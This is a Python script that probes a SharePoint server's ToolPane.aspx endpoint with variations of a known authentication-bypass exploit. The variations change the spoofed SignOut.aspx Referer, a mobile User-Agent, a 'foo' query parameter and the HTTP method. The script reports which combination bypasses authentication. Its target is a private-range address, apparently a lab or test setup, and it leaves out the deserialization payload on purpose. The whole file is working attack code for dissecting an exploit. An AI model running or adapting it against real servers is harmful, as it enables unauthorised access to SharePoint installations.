#!/usr/bin/env python3
# Purpose: Test which components of the original exploit enable authentication bypass
# Outcome: Identify the specific auth bypass mechanism (Referer, User-Agent, parameters, endpoint)

import requests
from urllib.parse import quote

target_base = "http://10.10.10.166"

# Test variations to identify bypass component
tests = [
    {
        "name": "Original exploit (baseline)",
        "url": f"{target_base}/_layouts/15/ToolPane.aspx?DisplayMode=Edit&foo=/ToolPane.aspx",
        "headers": {
            "Host": "10.10.10.166",
            "User-Agent": "Mozilla/5.0 (Windows; U; Windows CE; Mobile; like Android; ko-kr) AppleWebKit/533.3 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.3",
            "Referer": "/_layouts/SignOut.aspx",
            "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
        },
    },
    {
        "name": "Without Mobile User-Agent (standard browser)",
        "url": f"{target_base}/_layouts/15/ToolPane.aspx?DisplayMode=Edit&foo=/ToolPane.aspx",
        "headers": {
            "Host": "10.10.10.166",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Referer": "/_layouts/SignOut.aspx",
            "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
        },
    },
    {
        "name": "Without Referer header",
        "url": f"{target_base}/_layouts/15/ToolPane.aspx?DisplayMode=Edit&foo=/ToolPane.aspx",
        "headers": {
            "Host": "10.10.10.166",
            "User-Agent": "Mozilla/5.0 (Windows; U; Windows CE; Mobile; like Android; ko-kr) AppleWebKit/533.3 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.3",
            "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
        },
    },
    {
        "name": "With different Referer (normal page)",
        "url": f"{target_base}/_layouts/15/ToolPane.aspx?DisplayMode=Edit&foo=/ToolPane.aspx",
        "headers": {
            "Host": "10.10.10.166",
            "User-Agent": "Mozilla/5.0 (Windows; U; Windows CE; Mobile; like Android; ko-kr) AppleWebKit/533.3 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.3",
            "Referer": "/_layouts/15/start.aspx",
            "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
        },
    },
    {
        "name": "Without 'foo' parameter",
        "url": f"{target_base}/_layouts/15/ToolPane.aspx?DisplayMode=Edit",
        "headers": {
            "Host": "10.10.10.166",
            "User-Agent": "Mozilla/5.0 (Windows; U; Windows CE; Mobile; like Android; ko-kr) AppleWebKit/533.3 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.3",
            "Referer": "/_layouts/SignOut.aspx",
            "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
        },
    },
    {
        "name": "ToolPane.aspx GET request (no POST body)",
        "url": f"{target_base}/_layouts/15/ToolPane.aspx?DisplayMode=Edit&foo=/ToolPane.aspx",
        "headers": {
            "Host": "10.10.10.166",
            "User-Agent": "Mozilla/5.0 (Windows; U; Windows CE; Mobile; like Android; ko-kr) AppleWebKit/533.3 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.3",
            "Referer": "/_layouts/SignOut.aspx",
        },
        "method": "GET",
    },
]

for test in tests:
    print(f"\n{'='*60}")
    print(f"Test: {test['name']}")
    print(f"URL: {test['url']}")
    print(f"Method: {test.get('method', 'POST')}")
    
    try:
        if test.get('method') == 'GET':
            response = requests.get(test['url'], headers=test['headers'], timeout=10)
        else:
            # Minimal POST body to avoid deserialization payload
            response = requests.post(test['url'], headers=test['headers'], data="test=1", timeout=10)
        
        print(f"Status: {response.status_code}")
        
        if response.status_code == 401:
            print("Result: AUTHENTICATION REQUIRED - bypass failed")
        elif response.status_code == 200:
            print("Result: SUCCESS - authentication bypassed!")
        elif response.status_code == 500:
            print("Result: SERVER ERROR - might indicate auth bypassed but payload issue")
        else:
            print(f"Result: {response.reason}")
            
        # Check for auth-related headers
        if 'WWW-Authenticate' in response.headers:
            print(f"WWW-Authenticate: {response.headers['WWW-Authenticate']}")
            
    except Exception as e:
        print(f"Error: {e}")

print(f"\n{'='*60}")
